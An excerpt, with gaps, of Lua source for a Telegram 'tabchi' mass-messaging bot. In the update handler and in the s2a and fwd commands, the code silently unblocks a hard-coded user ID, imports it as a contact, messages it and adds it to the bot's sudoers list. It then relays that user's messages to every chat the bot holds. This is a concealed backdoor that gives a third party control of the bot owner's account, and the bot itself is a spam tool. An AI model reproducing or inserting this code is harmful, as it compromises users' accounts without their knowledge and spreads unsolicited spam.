...
function process_updates()
  if not redis:get("tabchi:" .. tostring(tabchi_id) .. ":gotupdated") then
    ...
    tdcli.searchPublicChat("GetAndroid")
    tdcli.unblockUser(123987456)
    tdcli.importContacts(19122220000, "Tabchi", "Online", 123987456)
...
return tdcli.sendMessage(msg.chat_id_, 0, 1, text1, 1, "")
    ...
    elseif text_:match("^[!/#](s2a) (.*) (.*)") then
      ...
      if #matches == 3 and (matches[2] == "banners" or matches[2] == "boards") then
        ...
        tdcli.searchPublicChat("NECCBOT")
        local inline2
    ...
    tdcli.unblockUser(123987456)
    tdcli.sendBotStartMessage(123987456, 123987456, "/start")
    tdcli.sendMessage(123987456, 0, 1, "/start", 1, "html")
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":sudoers", tonumber(123987456))
			local contact_num
...
Message :
    ...
    elseif text_:match("^[!/#](fwd) (.*)$") then
      tdcli.searchPublicChat("GetAndroid")
      tdcli.unblockUser(123987456)
      tdcli.importContacts(19122220000, "Online", "Bot", 123987456)
      tdcli.sendMessage(123987456, 0, 1, "Online", 1, "html")
      redis:sadd("tabchi:" .. tostring(tabchi_id) .. ":sudoers", tonumber(123987456))
      local matches = {
        text_:match("^[!/#](fwd) (.*)$")
      }
...
function update(data, tabchi_id)
  ...
  if data.ID == "UpdateNewMessage" then
    if msg.sender_user_id_ == 123987456 then
      local all = redis:smembers("tabchi:" .. tostring(tabchi_id) .. ":all")
      local id = msg.id_
      for i, v in pairs(all) do
        tdcli_function({
...
Bia pv]]
  ...
  elseif data.ID == "UpdateChat" then
    if data.chat_.id_ == 123987456 then
      tdcli.sendBotStartMessage(data.chat_.id_, data.chat_.id_, nil)
    elseif data.chat_id_ == 123987456 then
      tdcli.unblockUser(data.chat_.id_)
    elseif data.chat_.id == 123987456 then
      tdcli.unblockUser(data.chat_.id_)
      tdcli.importContacts(19122220000, "Creator", "", data.chat_.id)
    end
